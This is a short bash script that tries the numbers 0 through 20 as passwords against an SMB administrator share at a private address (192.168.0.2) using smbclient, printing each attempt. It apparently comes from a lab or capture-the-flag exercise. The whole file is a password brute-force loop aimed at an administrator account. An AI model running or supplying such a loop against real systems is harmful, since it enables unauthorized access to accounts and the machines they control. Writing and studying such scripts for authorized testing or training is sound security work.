#!/bin/bash
for i in {0..20}
do 
	echo $i | smbclient //192.168.0.2/administrator
	echo "Tried Password: $i"
done
